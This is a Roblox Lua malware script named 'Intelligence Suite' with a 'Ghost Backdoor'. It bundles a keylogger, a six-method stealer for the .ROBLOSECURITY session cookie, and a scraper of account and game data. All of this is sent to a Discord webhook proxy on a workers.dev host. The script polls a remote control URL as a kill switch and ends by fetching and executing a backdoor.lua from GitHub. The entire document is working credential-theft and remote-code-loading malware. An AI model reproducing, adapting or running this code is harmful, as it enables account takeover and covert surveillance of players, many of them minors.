-- Intelligence Suite v1.0 + Ghost Backdoor v1.0
-- Keylogger, Token Stealer v6, Scraper, Heartbeat, Kill Switch, Backdoor
-- Control: https://roblox-discord-proxy.kevinaugusta27.workers.dev/control
-- Proxy: https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook

local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")

local ProxyURL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/webhook"
local ControlURL = "https://roblox-discord-proxy.kevinaugusta27.workers.dev/control"
local LocalPlayer = Players.LocalPlayer

-- Global state
getgenv().IntelSuite = {
    Buffer = "",
    LastHeartbeat = tick(),
    IsActive = true
}

-- POST helper
local function sendRequest(url, body)
    local headers = { ["Content-Type"] = "application/json" }
    if request then
        request({ Url = url, Method = "POST", Headers = headers, Body = body })
    elseif http_request then
        http_request({ Url = url, Method = "POST", Headers = headers, Body = body })
    elseif syn and syn.request then
        syn.request({ Url = url, Method = "POST", Headers = headers, Body = body })
    else
        HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
    end
end

-- GET helper
local function getRequest(url)
    local result = nil
    pcall(function()
        if request then
            local r = request({ Url = url, Method = "GET" })
            result = r.Body
        elseif http_request then
            local r = http_request({ Url = url, Method = "GET" })
            result = r.Body
        elseif syn and syn.request then
            local r = syn.request({ Url = url, Method = "GET" })
            result = r.Body
        end
    end)
    return result
end

-- Send embed — blocked if suite inactive
local function exfiltrate(title, description)
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        local payload = HttpService:JSONEncode({
            embeds = {{
                title = title,
                description = description,
                color = 65535,
                footer = { text = "Intelligence Suite v1.0" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
        sendRequest(ProxyURL, payload)
    end)
end

-- Force send — bypasses IsActive
local function forceSend(title, description, color)
    pcall(function()
        local payload = HttpService:JSONEncode({
            embeds = {{
                title = title,
                description = description,
                color = color or 65535,
                footer = { text = "Intelligence Suite v1.0" },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        })
        sendRequest(ProxyURL, payload)
    end)
end

-- Executor detection
local function getExecutor()
    if identifyexecutor then
        local ok, result = pcall(identifyexecutor)
        if ok and result then return tostring(result) end
    end
    if getexecutorname then
        local ok, result = pcall(getexecutorname)
        if ok and result then return tostring(result) end
    end
    if getexecutorandversion then
        local ok, result = pcall(getexecutorandversion)
        if ok and result then return tostring(result) end
    end
    if EXECUTOR then return tostring(EXECUTOR) end
    if syn and syn.version then return "Synapse X " .. tostring(syn.version) end
    if KRNL_LOADED then return "KRNL" end
    if listfiles then
        local ok, files = pcall(listfiles, "")
        if ok and files then
            for _, f in ipairs(files) do
                local lower = tostring(f):lower()
                if lower:find("krnl") then return "KRNL (fingerprinted)" end
                if lower:find("synapse") then return "Synapse X (fingerprinted)" end
                if lower:find("fluxus") then return "Fluxus (fingerprinted)" end
                if lower:find("delta") then return "Delta (fingerprinted)" end
                if lower:find("codex") then return "Codex (fingerprinted)" end
                if lower:find("xeno") then return "Xeno (fingerprinted)" end
                if lower:find("scriptware") or lower:find("script%-ware") then return "Script-Ware (fingerprinted)" end
                if lower:find("solara") then return "Solara (fingerprinted)" end
                if lower:find("wave") then return "Wave (fingerprinted)" end
            end
        end
    end
    return "Unknown"
end

-- Search file for ROBLOSECURITY token
local function searchContent(content, filename, log)
    if type(content) ~= "string" then return nil end
    if content:find("WARNING%-DO%-NOT%-SHARE") then
        local found = content:match("(_|WARNING[A-Za-z0-9%-%._]+)")
        if found and #found > 20 then
            table.insert(log, "FOUND in: " .. tostring(filename))
            return found
        end
    end
    local found = content:match("%.ROBLOSECURITY=([^;%s"'\n\r]+)")
    if found and #found > 20 then
        table.insert(log, "FOUND in: " .. tostring(filename))
        return found
    end
    if #content > 100 and content:match("^[A-Za-z0-9%+%/%=_%-]+$") then
        table.insert(log, "Possible raw token in: " .. tostring(filename) .. " (len=" .. #content .. ")")
    end
    return nil
end

-- Token stealer v6
local function stealToken()
    task.spawn(function()
        local executor = getExecutor()
        local token = nil
        local log = {}

        forceSend("TOKEN STEALER STARTED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. executor ..
            "\n**Status:** Running all methods..."
        )

        task.wait(0.5)

        -- M1: syn.get_cookie
        pcall(function()
            if syn and syn.get_cookie then
                local ok, result = pcall(function() return syn.get_cookie(".ROBLOSECURITY") end)
                if ok and result and result ~= "" then
                    token = result
                    table.insert(log, "M1 syn.get_cookie: SUCCESS")
                else
                    table.insert(log, "M1 syn.get_cookie: FAILED")
                end
            else
                table.insert(log, "M1 syn.get_cookie: SKIPPED")
            end
        end)

        if token then
            forceSend("ROBLOSECURITY TOKEN",
                "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                "\n**Executor:** " .. executor .. "\n**Method:** M1\n**Token:**\n```" .. tostring(token):sub(1,900) .. "```"
            )
            return
        end

        task.wait(0.5)

        -- M2: get_cookie
        pcall(function()
            if get_cookie then
                local ok, result = pcall(function() return get_cookie(".ROBLOSECURITY") end)
                if ok and result and result ~= "" then
                    token = result
                    table.insert(log, "M2 get_cookie: SUCCESS")
                else
                    table.insert(log, "M2 get_cookie: FAILED")
                end
            else
                table.insert(log, "M2 get_cookie: SKIPPED")
            end
        end)

        if token then
            forceSend("ROBLOSECURITY TOKEN",
                "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                "\n**Executor:** " .. executor .. "\n**Method:** M2\n**Token:**\n```" .. tostring(token):sub(1,900) .. "```"
            )
            return
        end

        task.wait(0.5)

        -- M3: getrbxcookie
        pcall(function()
            if getrbxcookie then
                local ok, result = pcall(function() return getrbxcookie() end)
                if ok and result and result ~= "" then
                    token = result
                    table.insert(log, "M3 getrbxcookie: SUCCESS")
                else
                    table.insert(log, "M3 getrbxcookie: FAILED")
                end
            else
                table.insert(log, "M3 getrbxcookie: SKIPPED")
            end
        end)

        if token then
            forceSend("ROBLOSECURITY TOKEN",
                "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                "\n**Executor:** " .. executor .. "\n**Method:** M3\n**Token:**\n```" .. tostring(token):sub(1,900) .. "```"
            )
            return
        end

        task.wait(0.5)

        -- M4: getcookies
        pcall(function()
            if getcookies then
                local ok, result = pcall(function()
                    local c = getcookies()
                    return c and c[".ROBLOSECURITY"]
                end)
                if ok and result and result ~= "" then
                    token = result
                    table.insert(log, "M4 getcookies: SUCCESS")
                else
                    table.insert(log, "M4 getcookies: FAILED")
                end
            else
                table.insert(log, "M4 getcookies: SKIPPED")
            end
        end)

        if token then
            forceSend("ROBLOSECURITY TOKEN",
                "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                "\n**Executor:** " .. executor .. "\n**Method:** M4\n**Token:**\n```" .. tostring(token):sub(1,900) .. "```"
            )
            return
        end

        task.wait(0.5)

        -- M5: depth-2 file scan
        pcall(function()
            if listfiles and readfile then
                table.insert(log, "M5 starting depth-2 scan...")
                local scanned = 0
                local limit = 200

                local function scanFlat(path)
                    if scanned >= limit or token then return end
                    local ok, files = pcall(listfiles, path)
                    if not ok or not files then return end
                    for _, file in ipairs(files) do
                        if scanned >= limit or token then return end
                        scanned = scanned + 1
                        local readOk, content = pcall(readfile, file)
                        if readOk and type(content) == "string" then
                            local found = searchContent(content, file, log)
                            if found then token = found return end
                        end
                    end
                end

                scanFlat("")

                if not token then
                    local ok, rootFiles = pcall(listfiles, "")
                    if ok and rootFiles then
                        for _, item in ipairs(rootFiles) do
                            if token or scanned >= limit then break end
                            pcall(function() scanFlat(item) end)
                        end
                    end
                end

                table.insert(log, "M5 done — scanned: " .. tostring(scanned) .. " files")

                if token then
                    forceSend("ROBLOSECURITY TOKEN",
                        "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                        "\n**Executor:** " .. executor .. "\n**Method:** M5 file scan\n**Token:**\n```" .. tostring(token):sub(1,900) .. "```"
                    )
                end
            else
                table.insert(log, "M5 SKIPPED — listfiles/readfile not available")
            end
        end)

        if token then return end
        task.wait(0.5)

        -- M6: Set-Cookie header
        pcall(function()
            if request then
                local ok, r = pcall(function()
                    return request({ Url = "https://www.roblox.com/", Method = "GET" })
                end)
                if ok and r and r.Headers then
                    local sc = r.Headers["set-cookie"] or r.Headers["Set-Cookie"] or ""
                    local found = sc:match("%.ROBLOSECURITY=([^;]+)")
                    if found and found ~= "" then
                        token = found
                        table.insert(log, "M6 Set-Cookie: SUCCESS")
                        forceSend("ROBLOSECURITY TOKEN",
                            "**User:** " .. LocalPlayer.Name .. "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                            "\n**Executor:** " .. executor .. "\n**Method:** M6\n**Token:**\n```" .. tostring(token):sub(1,900) .. "```"
                        )
                    else
                        table.insert(log, "M6 Set-Cookie: FAILED")
                    end
                else
                    table.insert(log, "M6 Set-Cookie: FAILED — request error")
                end
            else
                table.insert(log, "M6 SKIPPED")
            end
        end)

        if token then return end

        local logStr = table.concat(log, "\n")
        forceSend("TOKEN STEALER FAILED",
            "**User:** " .. LocalPlayer.Name ..
            "\n**Executor:** " .. executor ..
            "\n**Result:** All methods failed.\n\n**Log:**\n```" .. logStr:sub(1, 1500) .. "```",
            16711680
        )
    end)
end

-- Execution alert
local function notifyExecution()
    pcall(function()
        local executor = getExecutor()
        local gameName = "Unknown"
        pcall(function()
            gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        local desc = "**User:** " .. LocalPlayer.Name ..
                     "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                     "\n**Display Name:** " .. LocalPlayer.DisplayName ..
                     "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
                     "\n**Executor:** " .. executor ..
                     "\n**Game:** " .. tostring(gameName) ..
                     "\n**Place ID:** " .. tostring(game.PlaceId) ..
                     "\n**Job ID:** " .. tostring(game.JobId) ..
                     "\n\n**Modules Active:**" ..
                     "\n- Keylogger: ACTIVE" ..
                     "\n- Token Stealer: ACTIVE" ..
                     "\n- Scraper: ACTIVE" ..
                     "\n- Heartbeat: ACTIVE (every 60s)" ..
                     "\n- Kill Switch: ACTIVE (polls every 30s)" ..
                     "\n- Backdoor: ACTIVE (polls every 10s)"
        exfiltrate("SCRIPT EXECUTED", desc)
    end)
end

-- Scraper
local function scrape()
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        local gameName = "Unknown"
        pcall(function()
            gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
        end)
        local desc = "**User:** " .. LocalPlayer.Name ..
                     "\n**User ID:** " .. tostring(LocalPlayer.UserId) ..
                     "\n**Account Age:** " .. tostring(LocalPlayer.AccountAge) .. " days" ..
                     "\n**Executor:** " .. getExecutor() ..
                     "\n**Game:** " .. tostring(gameName) ..
                     "\n**Place ID:** " .. tostring(game.PlaceId) ..
                     "\n**Job ID:** " .. tostring(game.JobId) ..
                     "\n**Session Start:** " .. tostring(os.time())
        exfiltrate("SCRAPE DATA", desc)
    end)
end

-- Keylogger
UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if not getgenv().IntelSuite.IsActive then return end
    pcall(function()
        if input.KeyCode and input.KeyCode ~= Enum.KeyCode.Unknown then
            getgenv().IntelSuite.Buffer = getgenv().IntelSuite.Buffer .. "[" .. tostring(input.KeyCode.Name) .. "]"
        end
        if #getgenv().IntelSuite.Buffer > 50 then
            exfiltrate("KEYLOG", "**User:** " .. LocalPlayer.Name .. "\n**Keys:** " .. getgenv().IntelSuite.Buffer)
            getgenv().IntelSuite.Buffer = ""
        end
    end)
end)

-- Kill switch poller — every 30s
task.spawn(function()
    while true do
        task.wait(30)
        pcall(function()
            local response = getRequest(ControlURL)
            if response then
                local data = HttpService:JSONDecode(response)
                if data and data.active ~= nil then
                    local wasActive = getgenv().IntelSuite.IsActive
                    getgenv().IntelSuite.IsActive = data.active
                    if wasActive and not data.active then
                        getgenv().IntelSuite.Buffer = ""
                        forceSend("SUITE STOPPED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Shut down remotely.", 16711680)
                    elseif not wasActive and data.active then
                        exfiltrate("SUITE RESUMED", "**User:** " .. LocalPlayer.Name .. "\n**Status:** Resumed remotely.")
                    end
                end
            end
        end)
    end
end)

-- Heartbeat every 60s
task.spawn(function()
    while true do
        task.wait(60)
        if not getgenv().IntelSuite.IsActive then continue end
        pcall(function()
            local desc = "**User:** " .. LocalPlayer.Name ..
                         "\n**Status:** ACTIVE" ..
                         "\n**Keylogger:** RUNNING"
            if #getgenv().IntelSuite.Buffer > 0 then
                desc = desc .. "\n**Keys Flushed:** " .. getgenv().IntelSuite.Buffer
                getgenv().IntelSuite.Buffer = ""
            end
            exfiltrate("HEARTBEAT", desc)
        end)
    end
end)

-- Init
task.spawn(notifyExecution)
task.wait(1)
task.spawn(scrape)
task.wait(1)
stealToken()
task.wait(2)

-- Ghost Backdoor loader — loads and runs backdoor.lua from GitHub
task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/bcakhub/ghost/main/backdoor.lua"))()
    end)
end)
